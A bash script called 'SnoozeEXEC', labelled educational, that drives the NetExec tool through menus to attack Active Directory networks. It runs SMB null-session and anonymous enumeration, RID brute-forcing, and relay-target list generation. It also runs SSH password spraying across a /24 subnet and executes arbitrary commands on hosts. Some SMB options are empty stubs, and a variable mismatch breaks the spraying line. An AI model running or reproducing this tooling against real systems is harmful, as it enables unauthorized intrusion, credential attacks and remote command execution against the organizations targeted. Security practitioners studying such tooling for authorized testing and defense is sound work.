#!/bin/bash

echo -e "\e[1;31m 
      ██████  ███▄    █  ▒█████   ▒█████  ▒███████▒▓█████ ▓█████ ▒██   ██▒▓█████  ▄████▄     
   ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▒██▒  ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█     
   ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒██░  ██▒░ ▒ ▄▀▒░ ▒███   ▒███   ░░  █   ░▒███   ▒▓█    ▄    
     ▒   ██▒▓██▒  ▐▌██▒▒██   ██░▒██   ██░  ▄▀▒   ░▒▓█  ▄ ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒   
   ▒██████▒▒▒██░   ▓██░░ ████▓▒░░ ████▓▒░▒███████▒░▒████▒░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░   
   ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░▒▒ ▓░▒░▒░░ ▒░ ░░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░   
   ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░ ░░▒ ▒ ░ ▒ ░ ░  ░ ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒      
   ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░ ░ ░ ░   ░      ░    ░    ░     ░   ░           
         ░           ░     ░ ░      ░ ░    ░ ░       ░  ░   ░  ░ ░    ░     ░  ░░ ░         
                                         ░                                      ░        \e[0m"   



echo "####################################"
echo "# SnoozeEXEC                       #"
echo "# by: Daniel Krilich               #"
echo "# contact: need@bugcrowdninja.com  #"
echo "# github.com/need-programming      #"
echo "# For Educational Purposes         #"
echo "# Snooze your way through NetExec  #"
echo "####################################"


# Menu selection
echo "------------------------------------"
echo "Choose the type of environment     |"
echo "[1] Active Directory               |"
echo "[0] Exit                           |"
echo "------------------------------------"
read -r type

if [ "$type" -eq 0 ]; then
    echo "Quitting"
    exit 0
fi

# Active Directory
if [ "$type" -eq 1 ]; then
    # Menu selection
    echo "------------------------------------"
    echo "Choose your Active Directory Asset  |"
    echo "[1] NetExec                         |"
    echo "[0] exit                            |"
    echo "------------------------------------"
    read -r asset

    if [ "$asset" -eq 0 ]; then
        echo "Quitting"
        exit 0
    fi

    if [ "$asset" -eq 1 ]; then
        echo "You chose NetExec"
        echo ""
        echo "Input the singular IP"
        read -r target_ip
        echo "Input Fully Qualified Domain Name (FQDN)"
        read -r fqdn

        # Choose the protocol to attack
        echo "------------------------------------"
        echo "Choose the protocol to attack       |"
        echo "[1] SMB                             |"
        echo "[2] SSH                             |"
        echo "[0] Exit                            |"
        echo "------------------------------------"
        read -r protocol

        if [ "$protocol" -eq 0 ]; then
            echo "Quitting.."
            exit 0
        fi

        if [ "$protocol" -eq 1 ]; then
            # SMB protocol selected
            echo "-------------------------------------------"
            echo "Choose your SMB attack path                 |"
            echo "[1] Enumeration                            |"
            echo "[2] Password Spraying                      |"
            echo "[3] Authentication                         |"
            echo "[4] Command Execution                      |"
            echo "-------------------------------------------"
            read -r attack_type

            # Handle different attack paths for SMB
            case "$attack_type" in
                1)  echo "----------------------------------------------"
                    echo "Choose your Enumeration path                  |"
                    echo "[1] Enumerate Hosts                           |"
                    echo "[2] Enumerate Null Sessions                   |"
                    echo "[3] Enumerate Anonymous Logon                 |"
                    echo "[4] Enumerate Hosts w/o SMB Signing Required  |"
                    echo "[5] Enumerate Active Sessions                 |"
                    echo "[6] Enumerate Shares and Access               |"
                    echo "[7] Enumerate Disks                           |"
                    echo "[8] Enumerate Logged on Users                 |"
                    echo "[9] Enumerate Domain Users                    |"
                    echo "[10] Enumerate Users by Bruteforcing RID      |"
                    echo "[11] Enumerate Domain Groups                  |"
                    echo "[12] Enumerate Local Groups                   |"
                    echo "[13] Enumerate Domain Password Policy         |"
                    echo "[14] Enumerate AV & EDR                       |"
                    echo "----------------------------------------------"
                    read -r enum_path

                    # Handle different enumeration paths for SMB
                    case "$enum_path" in
                        1)  enum_host1="netexec smb $target_ip"
                            echo "[+] Enumerating hosts..."
                            $enum_host1
                            ;;
                        2)  enum_host2="netexec smb $target_ip -u '' -p ''"
                            enum_host2shares="netexec smb $target_ip -u '' -p '' --shares"
                            enum_host2pass="netexec smb $target_ip -u '' -p '' --pass-pol"
                            enum_host2users="netexec smb $target_ip -u '' -p '' --users"
                            enum_host2group="netexec smb $target_ip -u '' -p '' --groups"
                            echo "[+] Enumerating NULL Hosts..."
                            $enum_host2
                            echo "[+] Enumerating NULL Host Shares..."
                            $enum_host2shares
                            echo "[+] Enumerating NULL Host Password Policy..."
                            $enum_host2pass
                            echo "[+] Enumerating NULL Host Users..."
                            $enum_host2users
                            echo "[+] Enumerating NULL Host Groups..."
                            $enum_host2group
                            ;;
                        3)  enum_host3="netexec smb $target_ip -u 'a' -p ''"
                            echo "[+] Enumerating Anonymous logon using user 'a'"
                            $enum_host3
                            ;;
                        4)  enum_host4="netexec smb $target_ip/24 --gen-relay-list relay_list.txt"
                            echo "[+] Enumerating Hosts w/o SMB Signing Required"
                            echo "Using /24 CIDR and saving to file 'relay_list.txt'"
                            $enum_host4
                            ;;
                        5)  echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host5="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --sessions"
                            echo "[+] Enumerating Active Sessions"
                            $enum_host5
                            ;;
                        6)  echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host6="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --shares --filter-shares READ WRITE"
                            echo "[+] Enumerating Read and Write Shares/Access"
                            $enum_host6
                            ;;
                        7)  echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host7="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --disks"
                            echo "[+] Enumerating Disks"
                            $enum_host7
                            ;;
                        8)  echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host8="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --loggedon-users"
                            echo "[+] Enumerating Logged on Users"
                            $enum_host8
                            ;;
                        9)  echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host9="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --users"
                            echo "[+] Enumerating Domain Users"
                            $enum_host9
                            ;;
                        10) echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host10="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --rid-brute"
                            echo "[+] Enumerating Users by Bruteforcing RID"
                            $enum_host10
                            ;;
                        11) echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host11="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --groups"
                            echo "[+] Enumerating Domain Groups"
                            $enum_host11
                            ;;
                        12) echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host12="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --local-group"
                            echo "[+] Enumerating Local Groups"
                            $enum_host12
                            ;;
                        13) echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host13="netexec smb $target_ip/24 -u $enum_user -p '$enum_pass' --pass-pol"
                            echo "[+] Enumerating Domain Password Policy"
                            $enum_host13
                            ;;
                        14) echo "Input Username"
                            read -r enum_user
                            echo "Input Password"
                            read -r enum_pass
                            enum_host14="netexec smb $target_ip -u $enum_user -p '$enum_pass' -M enum_av"
                            echo "[+] Enumerating AV & EDR"
                            ;;
                        *)  echo "Invalid option"
                            ;;
                    esac
                    ;;
                2)  # Add logic for other attack types under SMB protocol
                    ;;
                *)  echo "Invalid option"
                    ;;
            esac
        elif [ "$protocol" -eq 2 ]; then
            # SSH protocol selected
            echo "-------------------------------------------"
            echo "Choose your SSH attack path                |"
            echo "[1] Password Spraying                      |"
            echo "[2] Authentication                         |"
            echo "[3] Authentication w/ Specific Port        |"
            echo "[4] Command Execution                      |"
            echo "-------------------------------------------"
            read -r attack_type_ssh

            # Handle different attack paths for SSH
            case "$attack_type_ssh" in
                1)  echo "Enter the full directory for the userfile"
		    read user_file
		    echo "Enter the full directory for the passwordfile"
		    read pass_file
		    ssh_host1="netexec ssh $target_ip/24 -u $user_file -p $passfile --no-bruteforce"
		    echo "[+] Spraying Passwords..."
		    $ssh_host1
                    ;;
                2)  echo "Input Username"
                    read ssh_user
		    echo "Input Password"
		    read ssh_pass
		    ssh_host2="netexec ssh $target_ip/24 -u $ssh_user -p $ssh_pass"
		    echo "[+] Authenticating accross the domain.."
		    $ssh_host2
                    ;;
                3)  echo "Enter the specific port for authentication"
		    read ssh_port
		    ssh_host3="netexec ssh $target_ip/24 --port $ssh_port"
		    echo "[+] Authenticating over Port $ssh_port..."
		    $ssh_host3
                    ;;
                4)  echo "Input Username"
		    read ssh_user
		    echo "Input Password"
		    read ssh_pass
		    echo "What command do you want to execute on the host [Example: whoami]"
		    read ssh_command
		    ssh_host4="netexec ssh $target_ip/24 -u $ssh_user -p $ssh_pass -x $ssh_command"
		    echo "[+] Executing the command on the target..."
		    $ssh_host4
                    ;;
                *)  echo "Invalid option"
                    ;;
            esac
        fi
    fi
fi
